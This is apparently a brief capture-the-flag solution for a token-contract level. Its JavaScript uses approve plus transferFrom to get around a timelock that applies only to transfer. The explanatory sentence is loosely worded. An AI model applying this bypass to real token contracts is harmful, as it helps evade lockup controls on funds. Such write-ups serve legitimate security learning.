```javascript
let balance_to_transfer = await contract.balanceOf(player)

balance_to_transfer = balance_to_transfer.toString()

await contract.approve(player, balance_to_transfer)

await contract.transferFrom(player, "0x0", balance_to_transfer)
```


The vulnerability here is that approve and transferFrom is not implemented, so the timelock does not apply to them.